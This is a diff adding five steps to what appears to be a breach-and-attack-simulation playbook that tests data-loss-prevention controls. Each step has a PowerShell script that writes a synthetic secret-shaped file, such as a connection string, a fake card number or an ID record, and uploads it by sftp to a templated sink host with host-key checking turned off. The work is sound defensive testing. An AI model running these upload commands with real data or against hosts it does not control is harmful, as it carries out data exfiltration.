@@ -91,3 +91,253 @@ steps:
       # internal/sftpsink + internal/verifysync + internal/reporting's
       # sink-primary dlpVerifier, never from this script's own exit code.
     cleanup: ""
+
+  - name: "DLP Validation — SFTP Exfiltration of MS SQL Connection String (T1048.002)"
+    technique_id: T1048.002
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Uploads a synthetic MS-SQL-connection-string-shaped file via SFTP to the platform's own SFTP listener (this same on-prem orchestrator). If the endpoint has no OpenSSH Client installed, the step is skipped rather than attempted."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on the configured SFTP sink port"
+      - "Sysmon EID 1: sftp.exe process creation"
+    detection:
+      - "DLP/network: SSH/SFTP protocol handshake and file-transfer content inspection"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $sftpCmd = Get-Command sftp.exe -ErrorAction SilentlyContinue
+      if (-not $sftpCmd) {
+        Write-Output "skip: sftp.exe (OpenSSH Client) not found on this endpoint"
+        exit 0
+      }
+      $payload = "Server=bas-sim-mssql;Database=BAS_SIM_DLP;User Id=bas_sim_user;Password=BAS-SIM-DLP-Placeholder2;"
+      $tempFile = New-TemporaryFile
+      Set-Content -Path $tempFile -Value $payload -NoNewline
+      $remoteFile = "{{SINK_TOKEN}}.dat"
+      $batchFile = New-TemporaryFile
+      "put `"$($tempFile.FullName)`" `"$remoteFile`"" | Set-Content -Path $batchFile
+      try {
+        $output = & sftp.exe -oBatchMode=yes -oStrictHostKeyChecking=no -oUserKnownHostsFile=NUL -P {{SINK_SFTP_PORT}} -b $batchFile dlptest@{{SINK_SFTP_HOST}} 2>&1
+        $exitCode = $LASTEXITCODE
+        Write-Output "DLP_OBSERVATION: sftp_exit_code=$exitCode"
+        foreach ($line in $output) { Write-Output "DLP_OBSERVATION: sftp_output=$line" }
+        Write-Output "EXEC T1048.002: MS-SQL-connection-string-shaped SFTP exfiltration attempt completed (local exit code $exitCode -- see sink verification for the actual verdict). [BAS-SIM-DLP-SFTP]"
+      } catch {
+        Write-Output "DLP_OBSERVATION: sftp_exception=$($_.Exception.Message)"
+        Write-Output "EXEC T1048.002: SFTP exfiltration attempt raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-SFTP]"
+      } finally {
+        Remove-Item $tempFile, $batchFile -ErrorAction SilentlyContinue
+      }
+      # The DLP_OBSERVATION lines above are diagnostic evidence only -- this
+      # step's graded verdict comes entirely from whether the SFTP sink
+      # actually received the upload, resolved server-side by
+      # internal/sftpsink + internal/verifysync + internal/reporting's
+      # sink-primary dlpVerifier, never from this script's own exit code.
+    cleanup: ""
+
+  - name: "DLP Validation — SFTP Exfiltration of Java Source Code (T1048.002)"
+    technique_id: T1048.002
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Uploads a synthetic Java-source-code-shaped file (embedded fake secret) via SFTP to the platform's own SFTP listener (this same on-prem orchestrator). If the endpoint has no OpenSSH Client installed, the step is skipped rather than attempted."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on the configured SFTP sink port"
+      - "Sysmon EID 1: sftp.exe process creation"
+    detection:
+      - "DLP/network: SSH/SFTP protocol handshake and file-transfer content inspection"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $sftpCmd = Get-Command sftp.exe -ErrorAction SilentlyContinue
+      if (-not $sftpCmd) {
+        Write-Output "skip: sftp.exe (OpenSSH Client) not found on this endpoint"
+        exit 0
+      }
+      $payload = "// [BAS-SIM-DLP]`nString dbPassword = `"BAS-SIM-DLP-Placeholder6`"; // test fixture"
+      $tempFile = New-TemporaryFile
+      Set-Content -Path $tempFile -Value $payload -NoNewline
+      $remoteFile = "{{SINK_TOKEN}}.dat"
+      $batchFile = New-TemporaryFile
+      "put `"$($tempFile.FullName)`" `"$remoteFile`"" | Set-Content -Path $batchFile
+      try {
+        $output = & sftp.exe -oBatchMode=yes -oStrictHostKeyChecking=no -oUserKnownHostsFile=NUL -P {{SINK_SFTP_PORT}} -b $batchFile dlptest@{{SINK_SFTP_HOST}} 2>&1
+        $exitCode = $LASTEXITCODE
+        Write-Output "DLP_OBSERVATION: sftp_exit_code=$exitCode"
+        foreach ($line in $output) { Write-Output "DLP_OBSERVATION: sftp_output=$line" }
+        Write-Output "EXEC T1048.002: Java-source-code-shaped SFTP exfiltration attempt completed (local exit code $exitCode -- see sink verification for the actual verdict). [BAS-SIM-DLP-SFTP]"
+      } catch {
+        Write-Output "DLP_OBSERVATION: sftp_exception=$($_.Exception.Message)"
+        Write-Output "EXEC T1048.002: SFTP exfiltration attempt raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-SFTP]"
+      } finally {
+        Remove-Item $tempFile, $batchFile -ErrorAction SilentlyContinue
+      }
+      # The DLP_OBSERVATION lines above are diagnostic evidence only -- this
+      # step's graded verdict comes entirely from whether the SFTP sink
+      # actually received the upload, resolved server-side by
+      # internal/sftpsink + internal/verifysync + internal/reporting's
+      # sink-primary dlpVerifier, never from this script's own exit code.
+    cleanup: ""
+
+  - name: "DLP Validation — SFTP Exfiltration of Financial Statement (T1048.002)"
+    technique_id: T1048.002
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Uploads a synthetic financial-statement-shaped file via SFTP to the platform's own SFTP listener (this same on-prem orchestrator). If the endpoint has no OpenSSH Client installed, the step is skipped rather than attempted."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on the configured SFTP sink port"
+      - "Sysmon EID 1: sftp.exe process creation"
+    detection:
+      - "DLP/network: SSH/SFTP protocol handshake and file-transfer content inspection"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $sftpCmd = Get-Command sftp.exe -ErrorAction SilentlyContinue
+      if (-not $sftpCmd) {
+        Write-Output "skip: sftp.exe (OpenSSH Client) not found on this endpoint"
+        exit 0
+      }
+      $payload = "[BAS-SIM-DLP] Financial Statement (Synthetic)`nCompany: BAS-SIM-Corp`nRevenue: `$0.00 (synthetic)`nNet Income: `$0.00 (synthetic)"
+      $tempFile = New-TemporaryFile
+      Set-Content -Path $tempFile -Value $payload -NoNewline
+      $remoteFile = "{{SINK_TOKEN}}.dat"
+      $batchFile = New-TemporaryFile
+      "put `"$($tempFile.FullName)`" `"$remoteFile`"" | Set-Content -Path $batchFile
+      try {
+        $output = & sftp.exe -oBatchMode=yes -oStrictHostKeyChecking=no -oUserKnownHostsFile=NUL -P {{SINK_SFTP_PORT}} -b $batchFile dlptest@{{SINK_SFTP_HOST}} 2>&1
+        $exitCode = $LASTEXITCODE
+        Write-Output "DLP_OBSERVATION: sftp_exit_code=$exitCode"
+        foreach ($line in $output) { Write-Output "DLP_OBSERVATION: sftp_output=$line" }
+        Write-Output "EXEC T1048.002: Financial-statement-shaped SFTP exfiltration attempt completed (local exit code $exitCode -- see sink verification for the actual verdict). [BAS-SIM-DLP-SFTP]"
+      } catch {
+        Write-Output "DLP_OBSERVATION: sftp_exception=$($_.Exception.Message)"
+        Write-Output "EXEC T1048.002: SFTP exfiltration attempt raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-SFTP]"
+      } finally {
+        Remove-Item $tempFile, $batchFile -ErrorAction SilentlyContinue
+      }
+      # The DLP_OBSERVATION lines above are diagnostic evidence only -- this
+      # step's graded verdict comes entirely from whether the SFTP sink
+      # actually received the upload, resolved server-side by
+      # internal/sftpsink + internal/verifysync + internal/reporting's
+      # sink-primary dlpVerifier, never from this script's own exit code.
+    cleanup: ""
+
+  - name: "DLP Validation — SFTP Exfiltration of Israeli ID Record (T1048.002)"
+    technique_id: T1048.002
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Uploads a synthetic Israeli-ID-shaped file via SFTP to the platform's own SFTP listener (this same on-prem orchestrator). If the endpoint has no OpenSSH Client installed, the step is skipped rather than attempted."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on the configured SFTP sink port"
+      - "Sysmon EID 1: sftp.exe process creation"
+    detection:
+      - "DLP/network: SSH/SFTP protocol handshake and file-transfer content inspection"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $sftpCmd = Get-Command sftp.exe -ErrorAction SilentlyContinue
+      if (-not $sftpCmd) {
+        Write-Output "skip: sftp.exe (OpenSSH Client) not found on this endpoint"
+        exit 0
+      }
+      $payload = "[BAS-SIM-DLP] Name,ID`nJohn BasSim,000000000"
+      $tempFile = New-TemporaryFile
+      Set-Content -Path $tempFile -Value $payload -NoNewline
+      $remoteFile = "{{SINK_TOKEN}}.dat"
+      $batchFile = New-TemporaryFile
+      "put `"$($tempFile.FullName)`" `"$remoteFile`"" | Set-Content -Path $batchFile
+      try {
+        $output = & sftp.exe -oBatchMode=yes -oStrictHostKeyChecking=no -oUserKnownHostsFile=NUL -P {{SINK_SFTP_PORT}} -b $batchFile dlptest@{{SINK_SFTP_HOST}} 2>&1
+        $exitCode = $LASTEXITCODE
+        Write-Output "DLP_OBSERVATION: sftp_exit_code=$exitCode"
+        foreach ($line in $output) { Write-Output "DLP_OBSERVATION: sftp_output=$line" }
+        Write-Output "EXEC T1048.002: Israeli-ID-shaped SFTP exfiltration attempt completed (local exit code $exitCode -- see sink verification for the actual verdict). [BAS-SIM-DLP-SFTP]"
+      } catch {
+        Write-Output "DLP_OBSERVATION: sftp_exception=$($_.Exception.Message)"
+        Write-Output "EXEC T1048.002: SFTP exfiltration attempt raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-SFTP]"
+      } finally {
+        Remove-Item $tempFile, $batchFile -ErrorAction SilentlyContinue
+      }
+      # The DLP_OBSERVATION lines above are diagnostic evidence only -- this
+      # step's graded verdict comes entirely from whether the SFTP sink
+      # actually received the upload, resolved server-side by
+      # internal/sftpsink + internal/verifysync + internal/reporting's
+      # sink-primary dlpVerifier, never from this script's own exit code.
+    cleanup: ""
+
+  - name: "DLP Validation — SFTP Exfiltration of American Express Card Record (T1048.002)"
+    technique_id: T1048.002
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Uploads a synthetic Amex-card-shaped file via SFTP to the platform's own SFTP listener (this same on-prem orchestrator). If the endpoint has no OpenSSH Client installed, the step is skipped rather than attempted."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on the configured SFTP sink port"
+      - "Sysmon EID 1: sftp.exe process creation"
+    detection:
+      - "DLP/network: SSH/SFTP protocol handshake and file-transfer content inspection"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $sftpCmd = Get-Command sftp.exe -ErrorAction SilentlyContinue
+      if (-not $sftpCmd) {
+        Write-Output "skip: sftp.exe (OpenSSH Client) not found on this endpoint"
+        exit 0
+      }
+      $payload = "[BAS-SIM-DLP] CardBrand,CardNumber`nAmerican Express,378282246310005"
+      $tempFile = New-TemporaryFile
+      Set-Content -Path $tempFile -Value $payload -NoNewline
+      $remoteFile = "{{SINK_TOKEN}}.dat"
+      $batchFile = New-TemporaryFile
+      "put `"$($tempFile.FullName)`" `"$remoteFile`"" | Set-Content -Path $batchFile
+      try {
+        $output = & sftp.exe -oBatchMode=yes -oStrictHostKeyChecking=no -oUserKnownHostsFile=NUL -P {{SINK_SFTP_PORT}} -b $batchFile dlptest@{{SINK_SFTP_HOST}} 2>&1
+        $exitCode = $LASTEXITCODE
+        Write-Output "DLP_OBSERVATION: sftp_exit_code=$exitCode"
+        foreach ($line in $output) { Write-Output "DLP_OBSERVATION: sftp_output=$line" }
+        Write-Output "EXEC T1048.002: Amex-card-shaped SFTP exfiltration attempt completed (local exit code $exitCode -- see sink verification for the actual verdict). [BAS-SIM-DLP-SFTP]"
+      } catch {
+        Write-Output "DLP_OBSERVATION: sftp_exception=$($_.Exception.Message)"
+        Write-Output "EXEC T1048.002: SFTP exfiltration attempt raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-SFTP]"
+      } finally {
+        Remove-Item $tempFile, $batchFile -ErrorAction SilentlyContinue
+      }
+      # The DLP_OBSERVATION lines above are diagnostic evidence only -- this
+      # step's graded verdict comes entirely from whether the SFTP sink
+      # actually received the upload, resolved server-side by
+      # internal/sftpsink + internal/verifysync + internal/reporting's
+      # sink-primary dlpVerifier, never from this script's own exit code.
+    cleanup: ""
